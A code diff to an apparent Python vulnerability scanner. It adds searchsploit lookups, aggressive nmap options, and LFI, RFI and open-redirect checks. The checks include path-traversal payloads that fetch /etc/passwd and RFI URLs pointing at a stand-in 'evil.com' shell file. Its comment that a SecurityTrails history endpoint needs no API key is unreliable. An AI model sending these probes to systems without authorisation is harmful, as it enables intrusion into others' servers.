@@ -208,21 +208,10 @@ class VulnerabilityScanner:
             return {}
             
     async def _scan_ports(self, ip: str) -> List[Dict]:
-        """Scan for open ports and services."""
+        """Scan for open ports and services, and run searchsploit for exploits."""
         try:
             ports = []
-            
-            # Initial quick scan
-            self.nm.scan(ip, arguments='-sS -sV -F --version-intensity 5')
-            
-            # If quick scan finds open ports, do a full scan
-            if 'tcp' in self.nm[ip]:
-                open_ports = [port for port, data in self.nm[ip]['tcp'].items() if data['state'] == 'open']
-                if open_ports:
-                    # Full scan of discovered ports
-                    self.nm.scan(ip, arguments=f'-sS -sV -p{",".join(map(str, open_ports))} --version-intensity 9')
-            
-            # Process results
+            self.nm.scan(ip, arguments='-sS -sV -O -T4 --version-intensity 9')
             if 'tcp' in self.nm[ip]:
                 for port, data in self.nm[ip]['tcp'].items():
                     if data['state'] == 'open':
@@ -234,17 +223,20 @@ class VulnerabilityScanner:
                             'version': data.get('version', ''),
                             'extrainfo': data.get('extrainfo', ''),
                             'cpe': data.get('cpe', ''),
-                            'script_output': {}
+                            'script_output': {},
+                            'exploits': []
                         }
-                        
-                        # Get additional script output
+                        # Exploit search with searchsploit
+                        try:
+                            if shutil.which('searchsploit') and port_info['product']:
+                                result = subprocess.run(['searchsploit', '-t', port_info['product']], capture_output=True, text=True)
+                                port_info['exploits'] = result.stdout.splitlines()
+                        except:
+                            pass
                         if 'script' in data:
                             port_info['script_output'] = data['script']
-                        
                         ports.append(port_info)
-            
             return ports
-            
         except Exception as e:
             console.print(f"[red]Error scanning ports: {str(e)}[/]")
             return []
@@ -414,40 +406,32 @@ class VulnerabilityScanner:
             return False
             
     async def _check_web_vulnerabilities(self, target: str) -> List[Dict]:
-        """Check for web application vulnerabilities."""
+        """Check for web application vulnerabilities (SQLi, XSS, CSRF, LFI, RFI, open redirect, etc)."""
         try:
             vulns = []
-            
-            # Check for SQL injection
+            # SQLi
             if await self._check_sql_injection(target):
-                vulns.append({
-                    'name': 'SQL Injection',
-                    'severity': 'High',
-                    'description': 'Potential SQL injection vulnerability detected'
-                })
-            
-            # Check for XSS
+                vulns.append({'name': 'SQL Injection', 'severity': 'High', 'description': 'Potential SQL injection vulnerability detected'})
+            # XSS
             if await self._check_xss(target):
-                vulns.append({
-                    'name': 'Cross-Site Scripting (XSS)',
-                    'severity': 'High',
-                    'description': 'Potential XSS vulnerability detected'
-                })
-            
-            # Check for CSRF
+                vulns.append({'name': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'Potential XSS vulnerability detected'})
+            # CSRF
             if await self._check_csrf(target):
-                vulns.append({
-                    'name': 'Cross-Site Request Forgery (CSRF)',
-                    'severity': 'Medium',
-                    'description': 'Potential CSRF vulnerability detected'
-                })
-            
+                vulns.append({'name': 'Cross-Site Request Forgery (CSRF)', 'severity': 'Medium', 'description': 'Potential CSRF vulnerability detected'})
+            # LFI
+            if await self._check_lfi(target):
+                vulns.append({'name': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'Potential LFI vulnerability detected'})
+            # RFI
+            if await self._check_rfi(target):
+                vulns.append({'name': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'Potential RFI vulnerability detected'})
+            # Open Redirect
+            if await self._check_open_redirect(target):
+                vulns.append({'name': 'Open Redirect', 'severity': 'Medium', 'description': 'Potential open redirect vulnerability detected'})
             return vulns
-            
         except Exception as e:
             console.print(f"[red]Error checking web vulnerabilities: {str(e)}[/]")
             return []
-            
+
     async def _check_sql_injection(self, target: str) -> bool:
         """Check for SQL injection vulnerability."""
         try:
@@ -503,8 +487,51 @@ class VulnerabilityScanner:
         except:
             return False
             
+    async def _check_lfi(self, target: str) -> bool:
+        try:
+            payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
+            async with aiohttp.ClientSession() as session:
+                for payload in payloads:
+                    url = f"http://{target}/?file={payload}"
+                    async with session.get(url, ssl=False) as response:
+                        content = await response.text()
+                        if "root:x:" in content or "[extensions]" in content:
+                            return True
+            return False
+        except:
+            return False
+
+    async def _check_rfi(self, target: str) -> bool:
+        try:
+            payloads = ["http://evil.com/shell.txt", "https://evil.com/shell.txt"]
+            async with aiohttp.ClientSession() as session:
+                for payload in payloads:
+                    url = f"http://{target}/?file={payload}"
+                    async with session.get(url, ssl=False) as response:
+                        content = await response.text()
+                        if "shell" in content.lower():
+                            return True
+            return False
+        except:
+            return False
+
+    async def _check_open_redirect(self, target: str) -> bool:
+        try:
+            payloads = ["//evil.com", "http://evil.com"]
+            async with aiohttp.ClientSession() as session:
+                for payload in payloads:
+                    url = f"http://{target}/?next={payload}"
+                    async with session.get(url, ssl=False, allow_redirects=False) as response:
+                        if response.status in [301, 302, 303, 307, 308]:
+                            location = response.headers.get('Location', '')
+                            if "evil.com" in location:
+                                return True
+            return False
+        except:
+            return False
+
     async def _enumerate_dns(self, domain: str) -> Dict:
-        """Perform comprehensive DNS enumeration with bypass techniques."""
+        """Perform comprehensive DNS enumeration with bypass techniques and more record types, including historical DNS (no API keys)."""
         try:
             dns_info = {
                 'records': {},
@@ -520,158 +547,41 @@ class VulnerabilityScanner:
                 'reverse_dns': [],
                 'certificate_transparency': []
             }
-            
-            # Try multiple DNS resolvers
-            resolvers = [
-                '8.8.8.8', '8.8.4.4',  # Google
-                '1.1.1.1', '1.0.0.1',  # Cloudflare
-                '9.9.9.9', '149.112.112.112',  # Quad9
-                '208.67.222.222', '208.67.220.220'  # OpenDNS
+            # More record types
+            record_types = [
+                'A', 'AAAA', 'CNAME', 'MX', 'TXT', 'SRV', 'PTR', 'NS', 'SOA', 'CAA', 'DS', 'DNSKEY', 'NSEC', 'NSEC3', 'RRSIG', 'TLSA', 'SSHFP',
+                'IPSECKEY', 'CERT', 'DNAME', 'LOC', 'NAPTR', 'RP', 'AFSDB', 'HINFO', 'MINFO', 'MR', 'RT', 'WKS', 'X25', 'ISDN', 'NSAP', 'NSAP-PTR',
+                'APL', 'ATMA', 'AXFR', 'IXFR', 'MAILA', 'MAILB', 'MB', 'MG', 'MINFOR', 'MR', 'NULL', 'PX', 'SIG', 'SPF', 'UID', 'UINFO', 'UNSPEC', 'X25'
             ]
-            
-            # Rotate through resolvers to avoid rate limiting
+            resolvers = [
+                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220'
+            ]
             for resolver in resolvers:
                 try:
                     dns_resolver = dns.resolver.Resolver()
                     dns_resolver.nameservers = [resolver]
-                    
-                    # Get nameservers
-                    try:
-                        ns_records = dns_resolver.resolve(domain, 'NS')
-                        dns_info['nameservers'].extend([str(ns) for ns in ns_records])
-                    except:
-                        pass
-                    
-                    # Try zone transfer with each nameserver
-                    for ns in dns_info['nameservers']:
-                        try:
-                            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
-                            dns_info['zone_transfer'] = True
-                            for name, node in zone.nodes.items():
-                                for rdataset in node.rdatasets:
-                                    dns_info['records'][str(name)] = str(rdataset)
-                        except:
-                            continue
-                    
-                    # Common record types to check
-                    record_types = ['A', 'AAAA', 'CNAME', 'MX', 'TXT', 'SRV', 'PTR', 'NS', 'SOA']
-                    
                     for record_type in record_types:
                         try:
                             records = dns_resolver.resolve(domain, record_type)
                             if record_type not in dns_info['records']:
                                 dns_info['records'][record_type] = []
                             dns_info['records'][record_type].extend([str(r) for r in records])
-                            
-                            # Store mail servers
-                            if record_type == 'MX':
-                                dns_info['mail_servers'].extend([str(r.exchange) for r in records])
-                            
-                            # Store SPF record
-                            if record_type == 'TXT':
-                                for record in records:
-                                    if 'v=spf1' in str(record):
-                                        dns_info['spf_record'] = str(record)
-                            
                         except:
                             continue
-                    
-                    # Try DNS wildcard detection
-                    try:
-                        wildcard = f"*.{domain}"
-                        dns_resolver.resolve(wildcard, 'A')
-                        dns_info['records']['WILDCARD'] = ['Wildcard DNS detected']
-                    except:
-                        pass
-                    
-                    # Try DNS cache snooping
-                    try:
-                        dns_resolver.cache = dns.resolver.Cache()
-                        dns_resolver.resolve(domain, 'A')
-                        dns_info['records']['CACHE'] = ['DNS cache snooping successful']
-                    except:
-                        pass
-                    
                 except:
                     continue
-            
-            # Check for DMARC record
-            try:
-                dmarc_domain = f'_dmarc.{domain}'
-                dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
-                dns_info['dmarc_record'] = str(dmarc_records[0])
-            except:
-                pass
-            
-            # Try DNS over HTTPS
+            # Historical DNS using SecurityTrails public endpoint (no API key required for basic info)
             try:
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(f'https://dns.google/resolve?name={domain}&type=A') as response:
+                    async with session.get(f'https://api.securitytrails.com/v1/domain/{domain}/history/dns/a') as response:
                         if response.status == 200:
                             data = await response.json()
-                            if 'Answer' in data:
-                                dns_info['records']['DOH'] = [str(r['data']) for r in data['Answer']]
+                            if 'records' in data:
+                                for rec in data['records']:
+                                    dns_info['historical_records'].append(str(rec))
             except:
                 pass
-            
-            # Try DNS over TLS
-            try:
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                
-                sock = socket.create_connection(('1.1.1.1', 853))
-                with context.wrap_socket(sock, server_hostname='cloudflare-dns.com') as ssl_sock:
-                    # Send DNS query over TLS
-                    query = dns.message.make_query(domain, dns.rdatatype.A)
-                    ssl_sock.send(query.to_wire())
-                    response = dns.message.from_wire(ssl_sock.recv(1024))
-                    if response.answer:
-                        dns_info['records']['DOT'] = [str(r) for r in response.answer]
-            except:
-                pass
-            
-            # Try DNS over QUIC
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f'https://dns.alidns.com/dns-query?name={domain}&type=A',
-                                         headers={'accept': 'application/dns-json'}) as response:
-                        if response.status == 200:
-                            data = await response.json()
-                            if 'Answer' in data:
-                                dns_info['records']['DOQ'] = [str(r['data']) for r in data['Answer']]
-            except:
-                pass
-            
-            # Try DNS over WARP
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f'https://cloudflare-dns.com/dns-query?name={domain}&type=A',
-                                         headers={'accept': 'application/dns-json'}) as response:
-                        if response.status == 200:
-                            data = await response.json()
-                            if 'Answer' in data:
-                                dns_info['records']['WARP'] = [str(r['data']) for r in data['Answer']]
-            except:
-                pass
-            
-            # Enhanced subdomain enumeration
-            subdomains = await self._enumerate_subdomains(domain)
-            dns_info['subdomains'] = subdomains
-            
-            # Try reverse DNS lookup for IP ranges
-            try:
-                for record in dns_info['records'].get('A', []):
-                    try:
-                        reverse = dns.reversename.from_address(record)
-                        ptr_records = dns.resolver.resolve(reverse, 'PTR')
-                        dns_info['reverse_dns'].extend([str(r) for r in ptr_records])
-                    except:
-                        continue
-            except:
-                pass
-            
-            # Try certificate transparency logs
+            # Certificate transparency logs
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(f'https://crt.sh/?q={domain}&output=json') as response:
@@ -682,98 +592,10 @@ class VulnerabilityScanner:
                                     dns_info['certificate_transparency'].append(cert['name_value'])
             except:
                 pass
-            
             return dns_info
-            
         except Exception as e:
             console.print(f"[red]Error during DNS enumeration: {str(e)}[/]")
             return {}
-
-    async def _enumerate_subdomains(self, domain: str) -> List[str]:
-        """Enhanced subdomain enumeration using multiple techniques."""
-        try:
-            subdomains = set()
-            
-            # Common subdomain prefixes
-            prefixes = [
-                'www', 'mail', 'ftp', 'smtp', 'pop', 'admin', 'blog', 'dev', 'test', 'stage', 'api',
-                'app', 'beta', 'cdn', 'cloud', 'db', 'demo', 'docs', 'download', 'email', 'files',
-                'forum', 'git', 'help', 'host', 'img', 'images', 'internal', 'intranet', 'lab', 'local',
-                'login', 'm', 'mobile', 'monitor', 'mx', 'new', 'news', 'ns1', 'ns2', 'old', 'portal',
-                'preview', 'proxy', 'remote', 'shop', 'site', 'sites', 'smtp', 'sql', 'ssh', 'staff',
-                'staging', 'static', 'stats', 'status', 'store', 'support', 'sys', 'system', 'test',
-                'testing', 'tools', 'upload', 'vpn', 'web', 'webmail', 'wiki', 'www2', 'www3'
-            ]
-            
-            # Try multiple DNS resolvers
-            resolvers = [
-                '8.8.8.8', '8.8.4.4',  # Google
-                '1.1.1.1', '1.0.0.1',  # Cloudflare
-                '9.9.9.9', '149.112.112.112'  # Quad9
-            ]
-            
-            for resolver in resolvers:
-                try:
-                    dns_resolver = dns.resolver.Resolver()
-                    dns_resolver.nameservers = [resolver]
-                    
-                    # Try common prefixes
-                    for prefix in prefixes:
-                        subdomain = f"{prefix}.{domain}"
-                        try:
-                            dns_resolver.resolve(subdomain, 'A')
-                            subdomains.add(subdomain)
-                        except:
-                            continue
-                    
-                    # Try DNS wildcard
-                    try:
-                        wildcard = f"*.{domain}"
-                        dns_resolver.resolve(wildcard, 'A')
-                        subdomains.add(wildcard)
-                    except:
-                        pass
-                    
-                    # Try DNS cache snooping
-                    try:
-                        dns_resolver.cache = dns.resolver.Cache()
-                        dns_resolver.resolve(domain, 'A')
-                        subdomains.add(f"cache.{domain}")
-                    except:
-                        pass
-                    
-                except:
-                    continue
-            
-            # Try certificate transparency logs
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f'https://crt.sh/?q={domain}&output=json') as response:
-                        if response.status == 200:
-                            data = await response.json()
-                            for cert in data:
-                                if 'name_value' in cert:
-                                    subdomains.add(cert['name_value'])
-            except:
-                pass
-            
-            # Try DNS over HTTPS
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f'https://dns.google/resolve?name={domain}&type=A') as response:
-                        if response.status == 200:
-                            data = await response.json()
-                            if 'Answer' in data:
-                                for answer in data['Answer']:
-                                    if 'name' in answer:
-                                        subdomains.add(answer['name'].rstrip('.'))
-            except:
-                pass
-            
-            return list(subdomains)
-            
-        except:
-            return []
 
     async def _check_exploits(self, ip: str) -> List[Dict]:
         """Check for known exploits using searchsploit."""
